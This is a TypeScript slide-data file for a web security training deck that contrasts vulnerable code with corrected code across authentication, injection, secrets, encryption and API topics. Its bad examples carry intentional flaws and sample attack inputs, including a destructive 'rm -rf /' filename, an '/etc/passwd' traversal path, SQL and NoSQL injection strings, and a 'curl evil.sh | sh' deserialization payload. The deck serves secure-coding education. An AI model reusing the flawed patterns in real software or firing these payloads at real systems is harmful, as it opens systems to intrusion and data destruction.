import type { LocSlide } from "./types";

export const slides: LocSlide[] = [
  // ── 1. Title ──────────────────────────────────────────────────────────
  {
    kind: "title",
    titleKey: "slide.title.title",
    subtitleKey: "slide.title.subtitle",
    tags: ["auth", "injection", "secrets", "infra", "APIs"],
    footerKey: "slide.title.footer",
  },

  // ── 2. Threat model ───────────────────────────────────────────────────
  {
    kind: "content",
    accent: "neutral",
    icon: "!",
    titleKey: "slide.threatModel.title",
    blocks: [
      { kind: "lead", textKey: "slide.threatModel.lead" },
      {
        kind: "cards",
        columns: 3,
        items: [
          {
            titleKey: "slide.threatModel.cards.cost.title",
            bodyKey: "slide.threatModel.cards.cost.body",
            accent: "red",
          },
          {
            titleKey: "slide.threatModel.cards.mttd.title",
            bodyKey: "slide.threatModel.cards.mttd.body",
            accent: "amber",
          },
          {
            titleKey: "slide.threatModel.cards.rootCause.title",
            bodyKey: "slide.threatModel.cards.rootCause.body",
            accent: "blue",
          },
        ],
      },
      { kind: "bullets", itemsKey: "slide.threatModel.bullets" },
    ],
  },

  // ── 3. Section 01 ─────────────────────────────────────────────────────
  {
    kind: "divider",
    number: "01",
    nameKey: "slide.section1.name",
    descriptionKey: "slide.section1.description",
    accent: "blue",
  },

  // ── 4. Password hashing ───────────────────────────────────────────────
  {
    kind: "content",
    accent: "blue",
    icon: "#",
    titleKey: "slide.passwords.title",
    blocks: [
      { kind: "lead", textKey: "slide.passwords.lead" },
      {
        kind: "code-compare",
        bad: {
          labelKey: "slide.passwords.badLabel",
          tone: "bad",
          lang: "python",
          code: `import hashlib

def hash_password(pw: str) -> str:
    # Fast hash → GPU cracks 10B/sec.
    # No salt → rainbow tables.
    return hashlib.md5(pw.encode()).hexdigest()

def verify(pw: str, stored: str) -> bool:
    return hash_password(pw) == stored`,
        },
        good: {
          labelKey: "slide.passwords.goodLabel",
          tone: "good",
          lang: "python",
          code: `from argon2 import PasswordHasher
from argon2.exceptions import VerifyMismatchError

ph = PasswordHasher(
    time_cost=3, memory_cost=64_000, parallelism=4
)

def hash_password(pw: str) -> str:
    return ph.hash(pw)   # salt embedded

def verify(pw: str, stored: str) -> bool:
    try: return ph.verify(stored, pw)
    except VerifyMismatchError: return False`,
        },
      },
      {
        kind: "tip",
        titleKey: "slide.passwords.tipTitle",
        bodyKey: "slide.passwords.tipBody",
      },
    ],
  },

  // ── 5. JWT attacks ────────────────────────────────────────────────────
  {
    kind: "content",
    accent: "blue",
    icon: "{}",
    titleKey: "slide.jwt.title",
    blocks: [
      {
        kind: "cards",
        columns: 3,
        items: [
          {
            titleKey: "slide.jwt.cards.algNone.title",
            bodyKey: "slide.jwt.cards.algNone.body",
            accent: "red",
          },
          {
            titleKey: "slide.jwt.cards.confusion.title",
            bodyKey: "slide.jwt.cards.confusion.body",
            accent: "red",
          },
          {
            titleKey: "slide.jwt.cards.weakSecret.title",
            bodyKey: "slide.jwt.cards.weakSecret.body",
            accent: "red",
          },
        ],
      },
      {
        kind: "code-compare",
        demoId: "jwt",
        bad: {
          labelKey: "slide.jwt.badLabel",
          tone: "bad",
          lang: "js",
          code: `import jwt from "jsonwebtoken";

// Accepts any algorithm — including "none".
// Secret loaded from a default.
const SECRET = process.env.JWT_SECRET || "dev";

export function verify(token) {
  return jwt.verify(token, SECRET);
}`,
        },
        good: {
          labelKey: "slide.jwt.goodLabel",
          tone: "good",
          lang: "js",
          code: `import jwt from "jsonwebtoken";

if (!process.env.JWT_SECRET) throw new Error("JWT_SECRET missing");
const SECRET = process.env.JWT_SECRET; // ≥ 32 bytes random

export function verify(token) {
  return jwt.verify(token, SECRET, {
    algorithms: ["HS256"],       // pin alg
    issuer: "api.example.com",
    audience: "web",
    maxAge: "15m",
  });
}`,
        },
      },
    ],
  },

  // ── 6. Session security ───────────────────────────────────────────────
  {
    kind: "content",
    accent: "blue",
    icon: "S",
    titleKey: "slide.sessions.title",
    blocks: [
      {
        kind: "code-compare",
        bad: {
          labelKey: "slide.sessions.badLabel",
          tone: "bad",
          lang: "js",
          code: `// XSS reads it. CSRF rides it.
res.cookie("sid", sessionId, {
  // no httpOnly  → JS can read
  // no secure    → sent over http
  // no sameSite  → CSRF
  maxAge: 30 * 24 * 60 * 60 * 1000,
});`,
        },
        good: {
          labelKey: "slide.sessions.goodLabel",
          tone: "good",
          lang: "js",
          code: `res.cookie("sid", sessionId, {
  httpOnly: true,        // no JS access
  secure: true,          // https only
  sameSite: "lax",       // CSRF defense
  path: "/",
  maxAge: 30 * 24 * 60 * 60 * 1000,
  // Rotate session id on login → kills fixation.
});

// On login:
await req.session.regenerate();`,
        },
      },
      {
        kind: "warning",
        titleKey: "slide.sessions.warningTitle",
        bodyKey: "slide.sessions.warningBody",
      },
    ],
  },

  // ── 7. RBAC / ABAC / IDOR ─────────────────────────────────────────────
  {
    kind: "content",
    accent: "blue",
    icon: "%",
    titleKey: "slide.authz.title",
    blocks: [
      { kind: "lead", textKey: "slide.authz.lead" },
      {
        kind: "code-compare",
        demoId: "idor",
        bad: {
          labelKey: "slide.authz.badLabel",
          tone: "bad",
          lang: "ts",
          code: `// GET /api/invoices/:id
app.get("/api/invoices/:id", auth, async (req, res) => {
  const inv = await db.invoice.findById(req.params.id);
  // No ownership check.
  // Anyone logged in can read any invoice.
  res.json(inv);
});`,
        },
        good: {
          labelKey: "slide.authz.goodLabel",
          tone: "good",
          lang: "ts",
          code: `app.get("/api/invoices/:id", auth, async (req, res) => {
  const inv = await db.invoice.findOne({
    _id: req.params.id,
    ownerId: req.user.id,   // ← the whole game
  });
  if (!inv) return res.status(404).end();
  // Return 404 (not 403): don't leak existence.
  res.json(inv);
});`,
        },
      },
      {
        kind: "tip",
        titleKey: "slide.authz.tipTitle",
        bodyKey: "slide.authz.tipBody",
      },
    ],
  },

  // ── 8. Section 02 ─────────────────────────────────────────────────────
  {
    kind: "divider",
    number: "02",
    nameKey: "slide.section2.name",
    descriptionKey: "slide.section2.description",
    accent: "red",
  },

  // ── 9. SQL injection ──────────────────────────────────────────────────
  {
    kind: "content",
    accent: "red",
    icon: ">_",
    titleKey: "slide.sqli.title",
    blocks: [
      { kind: "lead", textKey: "slide.sqli.lead" },
      {
        kind: "code-compare",
        demoId: "sqli",
        bad: {
          labelKey: "slide.sqli.badLabel",
          tone: "bad",
          lang: "python",
          code: `def login(email, password):
    # ' OR '1'='1  →  always true
    q = f"""
        SELECT id FROM users
        WHERE email = '{email}'
          AND password = '{password}'
    """
    return db.execute(q).fetchone()`,
        },
        good: {
          labelKey: "slide.sqli.goodLabel",
          tone: "good",
          lang: "python",
          code: `def login(email, password):
    # Driver sends query + params separately.
    # Input is never parsed as SQL.
    row = db.execute(
        "SELECT id, password_hash FROM users "
        "WHERE email = %s",
        (email,),
    ).fetchone()
    if not row: return None
    return row if verify(password, row.password_hash) else None`,
        },
      },
      {
        kind: "warning",
        titleKey: "slide.sqli.warningTitle",
        bodyKey: "slide.sqli.warningBody",
      },
    ],
  },

  // ── 10. NoSQL + command injection ─────────────────────────────────────
  {
    kind: "content",
    accent: "red",
    icon: "$",
    titleKey: "slide.nosqlCmd.title",
    blocks: [
      {
        kind: "code-compare",
        bad: {
          labelKey: "slide.nosqlCmd.nosqlBadLabel",
          tone: "bad",
          lang: "js",
          code: `// Body: { "email": "a@b.c", "password": { "$gt": "" } }
// → matches any user.
app.post("/login", async (req, res) => {
  const user = await User.findOne({
    email: req.body.email,
    password: req.body.password,
  });
  if (user) return res.json({ token: sign(user) });
});`,
        },
        good: {
          labelKey: "slide.nosqlCmd.nosqlGoodLabel",
          tone: "good",
          lang: "js",
          code: `app.post("/login", async (req, res) => {
  const email = String(req.body.email);
  const password = String(req.body.password);
  const user = await User.findOne({ email });
  if (!user) return res.status(401).end();
  if (!(await argon2.verify(user.hash, password)))
    return res.status(401).end();
  res.json({ token: sign(user) });
});`,
        },
      },
      {
        kind: "code-compare",
        bad: {
          labelKey: "slide.nosqlCmd.shellBadLabel",
          tone: "bad",
          lang: "python",
          code: `# filename = "a.png; rm -rf /"
subprocess.run(
    f"convert {filename} thumb.png",
    shell=True,
)`,
        },
        good: {
          labelKey: "slide.nosqlCmd.shellGoodLabel",
          tone: "good",
          lang: "python",
          code: `# argv list → no shell parsing.
subprocess.run(
    ["convert", filename, "thumb.png"],
    check=True, timeout=10,
)
# Plus: validate filename against allowlist.`,
        },
      },
    ],
  },

  // ── 11. Path traversal & SSRF ─────────────────────────────────────────
  {
    kind: "content",
    accent: "red",
    icon: "/",
    titleKey: "slide.pathSsrf.title",
    blocks: [
      {
        kind: "code-compare",
        bad: {
          labelKey: "slide.pathSsrf.badLabel",
          tone: "bad",
          lang: "js",
          code: `// GET /files?name=../../../etc/passwd
app.get("/files", (req, res) => {
  const p = path.join("/var/app/uploads", req.query.name);
  res.sendFile(p);
});`,
        },
        good: {
          labelKey: "slide.pathSsrf.goodLabel",
          tone: "good",
          lang: "js",
          code: `const BASE = path.resolve("/var/app/uploads");

app.get("/files", (req, res) => {
  const name = path.basename(String(req.query.name));
  const full = path.resolve(BASE, name);
  if (!full.startsWith(BASE + path.sep))
    return res.status(400).end();
  res.sendFile(full);
});`,
        },
      },
      {
        kind: "warning",
        titleKey: "slide.pathSsrf.warningTitle",
        bodyKey: "slide.pathSsrf.warningBody",
      },
    ],
  },

  // ── 12. Section 03 ────────────────────────────────────────────────────
  {
    kind: "divider",
    number: "03",
    nameKey: "slide.section3.name",
    descriptionKey: "slide.section3.description",
    accent: "green",
  },

  // ── 13. Secrets management ────────────────────────────────────────────
  {
    kind: "content",
    accent: "green",
    icon: "K",
    titleKey: "slide.secrets.title",
    blocks: [
      {
        kind: "cards",
        columns: 3,
        items: [
          {
            titleKey: "slide.secrets.cards.hardcoded.title",
            bodyKey: "slide.secrets.cards.hardcoded.body",
            accent: "red",
          },
          {
            titleKey: "slide.secrets.cards.env.title",
            bodyKey: "slide.secrets.cards.env.body",
            accent: "amber",
          },
          {
            titleKey: "slide.secrets.cards.vault.title",
            bodyKey: "slide.secrets.cards.vault.body",
            accent: "green",
          },
        ],
      },
      {
        kind: "code-compare",
        bad: {
          labelKey: "slide.secrets.badLabel",
          tone: "bad",
          lang: "python",
          code: `STRIPE_KEY = "sk_live_51HabcXYZ..."   # in main.py
DB_URL     = "postgres://app:hunter2@prod-db/app"

# Pushed once → key compromised forever.`,
        },
        good: {
          labelKey: "slide.secrets.goodLabel",
          tone: "good",
          lang: "python",
          code: `import os, boto3

def load_secret(name: str) -> str:
    client = boto3.client("secretsmanager")
    return client.get_secret_value(SecretId=name)["SecretString"]

STRIPE_KEY = load_secret(f"{os.environ['ENV']}/stripe/key")
# Rotated by AWS on a schedule. App re-reads on SIGHUP.`,
        },
      },
    ],
  },

  // ── 14. Encryption ────────────────────────────────────────────────────
  {
    kind: "content",
    accent: "green",
    icon: "E",
    titleKey: "slide.encryption.title",
    blocks: [
      {
        kind: "code-compare",
        bad: {
          labelKey: "slide.encryption.badLabel",
          tone: "bad",
          lang: "python",
          code: `# SSN stored as plain text.
# Any DB dump = full disclosure.
user.ssn = "123-45-6789"
session.commit()`,
        },
        good: {
          labelKey: "slide.encryption.goodLabel",
          tone: "good",
          lang: "python",
          code: `from cryptography.fernet import Fernet
fernet = Fernet(load_secret("ssn/key"))  # 32-byte key

def put_ssn(user, ssn: str):
    user.ssn_enc = fernet.encrypt(ssn.encode())

def get_ssn(user) -> str:
    return fernet.decrypt(user.ssn_enc).decode()
# Key in KMS, rotated. DB dump alone is useless.`,
        },
      },
      {
        kind: "code",
        block: {
          labelKey: "slide.encryption.tlsLabel",
          tone: "neutral",
          lang: "nginx",
          code: `server {
  listen 443 ssl http2;
  ssl_certificate     /etc/letsencrypt/live/api/fullchain.pem;
  ssl_certificate_key /etc/letsencrypt/live/api/privkey.pem;
  ssl_protocols       TLSv1.2 TLSv1.3;          # no SSLv3, no TLS 1.0/1.1
  ssl_ciphers         HIGH:!aNULL:!MD5;
  add_header Strict-Transport-Security
    "max-age=63072000; includeSubDomains; preload" always;
}`,
        },
      },
    ],
  },

  // ── 15. Section 04 ────────────────────────────────────────────────────
  {
    kind: "divider",
    number: "04",
    nameKey: "slide.section4.name",
    descriptionKey: "slide.section4.description",
    accent: "purple",
  },

  // ── 16. Rate limiting + timing attacks ────────────────────────────────
  {
    kind: "content",
    accent: "purple",
    icon: "~",
    titleKey: "slide.rateLimits.title",
    blocks: [
      {
        kind: "code",
        block: {
          labelKey: "slide.rateLimits.rateLabel",
          tone: "good",
          lang: "js",
          code: `import rateLimit from "express-rate-limit";

// Per-IP + per-route. Stricter on auth.
app.use("/api", rateLimit({
  windowMs: 60_000, max: 120, standardHeaders: true,
}));
app.use("/api/login", rateLimit({
  windowMs: 60_000, max: 5,
  // Use a distributed store (Redis) behind a load balancer.
  // And keyGenerator: by user/email, not just IP.
}));`,
        },
      },
      {
        kind: "code-compare",
        demoId: "timing",
        bad: {
          labelKey: "slide.rateLimits.timingBadLabel",
          tone: "bad",
          lang: "js",
          code: `// '==' returns early at first mismatch.
// Attacker measures response time to recover token byte by byte.
if (req.headers["x-api-token"] === expected) {
  return next();
}`,
        },
        good: {
          labelKey: "slide.rateLimits.timingGoodLabel",
          tone: "good",
          lang: "js",
          code: `import { timingSafeEqual } from "node:crypto";

const a = Buffer.from(req.headers["x-api-token"] ?? "", "utf8");
const b = Buffer.from(expected, "utf8");
if (a.length !== b.length) return res.status(401).end();
if (!timingSafeEqual(a, b))  return res.status(401).end();
return next();`,
        },
      },
    ],
  },

  // ── 17. CORS & headers ────────────────────────────────────────────────
  {
    kind: "content",
    accent: "purple",
    icon: "H",
    titleKey: "slide.cors.title",
    blocks: [
      {
        kind: "code-compare",
        bad: {
          labelKey: "slide.cors.badLabel",
          tone: "bad",
          lang: "js",
          code: `// Browser blocks this combo, but the intent is wrong:
// trying to allow "any origin" with cookies.
app.use(cors({
  origin: "*",
  credentials: true,
}));
// Or worse: reflect the Origin header.
app.use(cors({ origin: (o, cb) => cb(null, o) }));`,
        },
        good: {
          labelKey: "slide.cors.goodLabel",
          tone: "good",
          lang: "js",
          code: `import helmet from "helmet";

app.use(helmet());           // CSP, HSTS, X-Frame, X-Content-Type
app.use(cors({
  origin: ["https://app.example.com", "https://admin.example.com"],
  credentials: true,
  methods: ["GET", "POST", "PATCH", "DELETE"],
  allowedHeaders: ["Authorization", "Content-Type"],
}));`,
        },
      },
      {
        kind: "tip",
        titleKey: "slide.cors.tipTitle",
        bodyKey: "slide.cors.tipBody",
      },
    ],
  },

  // ── 18. Dependency CVEs ───────────────────────────────────────────────
  {
    kind: "content",
    accent: "purple",
    icon: "P",
    titleKey: "slide.supplyChain.title",
    blocks: [
      { kind: "lead", textKey: "slide.supplyChain.lead" },
      {
        kind: "code",
        block: {
          labelKey: "slide.supplyChain.auditLabel",
          tone: "good",
          lang: "yaml",
          code: `name: security
on: [push, pull_request]
jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: pnpm/action-setup@v4
      - run: pnpm install --frozen-lockfile
      - run: pnpm audit --audit-level=high   # fail on high+
      - uses: aquasecurity/trivy-action@master
        with: { scan-type: fs, severity: HIGH,CRITICAL, exit-code: 1 }`,
        },
      },
      {
        kind: "cards",
        columns: 2,
        items: [
          {
            titleKey: "slide.supplyChain.cards.tools.title",
            bulletsKey: "slide.supplyChain.cards.tools.bullets",
            accent: "purple",
          },
          {
            titleKey: "slide.supplyChain.cards.policy.title",
            bulletsKey: "slide.supplyChain.cards.policy.bullets",
            accent: "purple",
          },
        ],
      },
    ],
  },

  // ── 19. Section 05 ────────────────────────────────────────────────────
  {
    kind: "divider",
    number: "05",
    nameKey: "slide.section5.name",
    descriptionKey: "slide.section5.description",
    accent: "amber",
  },

  // ── 20. Mass assignment ───────────────────────────────────────────────
  {
    kind: "content",
    accent: "amber",
    icon: "M",
    titleKey: "slide.massAssignment.title",
    blocks: [
      { kind: "lead", textKey: "slide.massAssignment.lead" },
      {
        kind: "code-compare",
        demoId: "mass-assignment",
        bad: {
          labelKey: "slide.massAssignment.badLabel",
          tone: "bad",
          lang: "ts",
          code: `// PATCH /users/me   body: { name: "...", isAdmin: true }
app.patch("/users/me", auth, async (req, res) => {
  const updated = await User.update(req.user.id, req.body);
  res.json(updated);
});`,
        },
        good: {
          labelKey: "slide.massAssignment.goodLabel",
          tone: "good",
          lang: "ts",
          code: `import { z } from "zod";

const PatchMe = z.object({
  name: z.string().min(1).max(80),
  avatarUrl: z.string().url().optional(),
}).strict();   // unknown keys → reject

app.patch("/users/me", auth, async (req, res) => {
  const data = PatchMe.parse(req.body);
  const updated = await User.update(req.user.id, data);
  res.json(updated);
});`,
        },
      },
    ],
  },

  // ── 21. Deserialization ───────────────────────────────────────────────
  {
    kind: "content",
    accent: "amber",
    icon: "D",
    titleKey: "slide.deserialization.title",
    blocks: [
      { kind: "lead", textKey: "slide.deserialization.lead" },
      {
        kind: "code-compare",
        bad: {
          labelKey: "slide.deserialization.badLabel",
          tone: "bad",
          lang: "python",
          code: `# Session cookie payload, deserialized server-side.
data = pickle.loads(base64.b64decode(cookie))
# Attacker crafts a payload whose __reduce__ runs:
#   os.system("curl evil.sh | sh")
# Instant RCE.`,
        },
        good: {
          labelKey: "slide.deserialization.goodLabel",
          tone: "good",
          lang: "python",
          code: `import json, hmac, hashlib, base64

def sign(payload: dict) -> str:
    body = json.dumps(payload, sort_keys=True).encode()
    sig = hmac.new(SECRET, body, hashlib.sha256).digest()
    return base64.urlsafe_b64encode(body + b"." + sig).decode()

def verify(token: str) -> dict:
    raw = base64.urlsafe_b64decode(token)
    body, sig = raw.rsplit(b".", 1)
    expected = hmac.new(SECRET, body, hashlib.sha256).digest()
    if not hmac.compare_digest(sig, expected): raise ValueError
    return json.loads(body)`,
        },
      },
    ],
  },

  // ── 22. Logging & errors ──────────────────────────────────────────────
  {
    kind: "content",
    accent: "amber",
    icon: "L",
    titleKey: "slide.logging.title",
    blocks: [
      {
        kind: "cards",
        columns: 2,
        items: [
          {
            titleKey: "slide.logging.cards.doLog.title",
            bulletsKey: "slide.logging.cards.doLog.bullets",
            accent: "green",
          },
          {
            titleKey: "slide.logging.cards.neverLog.title",
            bulletsKey: "slide.logging.cards.neverLog.bullets",
            accent: "red",
          },
        ],
      },
      {
        kind: "code-compare",
        bad: {
          labelKey: "slide.logging.badLabel",
          tone: "bad",
          lang: "js",
          code: `app.use((err, req, res, next) => {
  // Leaks file paths, queries, secrets in error messages.
  res.status(500).send(err.stack);
});`,
        },
        good: {
          labelKey: "slide.logging.goodLabel",
          tone: "good",
          lang: "js",
          code: `app.use((err, req, res, next) => {
  const id = req.id ?? crypto.randomUUID();
  log.error({ id, route: req.path, err }, "unhandled");
  // Generic message + correlation id.
  res.status(500).json({
    error: "internal_error",
    requestId: id,
  });
});`,
        },
      },
    ],
  },

  // ── 23. Close ─────────────────────────────────────────────────────────
  {
    kind: "content",
    accent: "neutral",
    icon: "✓",
    titleKey: "slide.close.title",
    blocks: [
      { kind: "bullets", itemsKey: "slide.close.bullets" },
      {
        kind: "tip",
        titleKey: "slide.close.tipTitle",
        links: [
          { labelKey: "_link.owaspTop10", url: "https://owasp.org/Top10/" },
          {
            labelKey: "_link.owaspAsvs",
            url: "https://owasp.org/www-project-application-security-verification-standard/",
          },
          {
            labelKey: "_link.owaspCheatSheets",
            url: "https://cheatsheetseries.owasp.org/",
          },
          {
            labelKey: "_link.portSwigger",
            url: "https://portswigger.net/web-security",
          },
          {
            labelKey: "_link.projectZero",
            url: "https://googleprojectzero.blogspot.com/",
          },
          {
            labelKey: "_link.githubAdvisories",
            url: "https://github.com/advisories",
          },
        ],
      },
    ],
  },
];
